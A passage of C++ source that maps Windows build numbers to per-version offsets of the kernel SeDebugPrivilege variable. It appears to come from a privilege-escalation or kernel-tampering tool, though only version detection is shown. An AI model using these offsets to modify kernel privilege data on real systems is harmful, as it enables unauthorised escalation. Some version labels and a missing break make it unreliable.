            std::wcout << L"  Windows 10 1607 / Windows Server 2016" << std::endl;
            PAGEDATA_NtSeDebugPrivilege_Offset = WS16_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        case 17763:
            std::wcout << L"  Windows 10 1809 / Windows Server 2019" << std::endl;
            PAGEDATA_NtSeDebugPrivilege_Offset = WS19_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        case 10240: std::wcout << L"  Windows 10 1507" << std::endl; break;
        case 10586: std::wcout << L"  Windows 10 1511" << std::endl; break;
        case 15063: std::wcout << L"  Windows 10 1703" << std::endl; break;
        case 16299: std::wcout << L"  Windows 10 1709" << std::endl; break;
        case 17134: std::wcout << L"  Windows 10 1803" << std::endl; break;
        case 18362: std::wcout << L"  Windows 10 1903" << std::endl; break;
        case 18363: std::wcout << L"  Windows 10 1909" << std::endl; break;
        case 19041: std::wcout << L"  Windows 10 2004 / Windows Server 2004" << std::endl; break;
        case 19042: std::wcout << L"  Windows 10 20H2 / Windows Server 20H2" << std::endl; break;
        case 19043: std::wcout << L"  Windows 10 21H1 / Windows Server 21H1" << std::endl; break;
        case 20348:
            std::wcout << L"  Windows Server 2022" << std::endl;
            switch (OSVersion.RevisionNumber) {
            case 2227:
                PAGEDATA_NtSeDebugPrivilege_Offset = WS22_PAGEDATA_NtSeDebugPrivilege_Offset_1;
                break;
            case 2461:
                PAGEDATA_NtSeDebugPrivilege_Offset = WS22_PAGEDATA_NtSeDebugPrivilege_Offset_5;
                break;
            }
            break;
        case 22000: std::wcout << L"  Windows 10 21H2 / Windows 11" << std::endl; break;
        case 22631: std::wcout << L"  Windows 10 23H2 / Windows 11" << std::endl; break;
        case 26100: std::wcout << L"  Windows Server 2025" << std::endl;
        default: std::wcout << L"  Unknown Windows 10 version" << std::endl; break;
        }
        break;
    case 6:
        switch (OSVersion.MinorVersion) {
        case 3:
            if (OSVersion.BuildNumber == 9600) {
                std::wcout << L"  Windows 8.1 / Windows Server 2012 R2" << std::endl;
                PAGEDATA_NtSeDebugPrivilege_Offset = WS12R2_PAGEDATA_NtSeDebugPrivilege_Offset;
            }
            break;
        case 2:
            if (OSVersion.BuildNumber == 9200) {
                std::wcout << L"  Windows 8 / Windows Server 2012" << std::endl;
                PAGEDATA_NtSeDebugPrivilege_Offset = WS12_PAGEDATA_NtSeDebugPrivilege_Offset;
            }
            break;
        case 1:
            if (OSVersion.BuildNumber == 7601) {
                std::wcout << L"  Windows 7 SP1 / Windows Server 2008 R2 SP1" << std::endl;
            }

            PAGEDATA_NtSeDebugPrivilege_Offset = WS08R2_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        case 0:
            if (OSVersion.BuildNumber == 6002) {
                std::wcout << L"  Windows Vista SP2 / Windows Server 2008 SP2" << std::endl;
            }
            else if (OSVersion.BuildNumber == 6001) {
                std::wcout << L"  Windows Vista SP1 / Windows Server 2008 SP1" << std::endl;
            }
            else {
                std::wcout << L"  Windows Vista / Windows Server 2008" << std::endl;
            }

            PAGEDATA_NtSeDebugPrivilege_Offset = WS08_PAGEDATA_NtSeDebugPrivilege_Offset;
            break;
        default:
            std::wcout << L"  Unknown Windows version (Major: 6, Minor: " << OSVersion.MinorVersion << ")" << std::endl;
            break;
        }
        break;
    default:
        std::wcout << L"  Unknown Windows version (Major: " << OSVersion.MajorVersion << ")" << std::endl;
        break;
    }
}
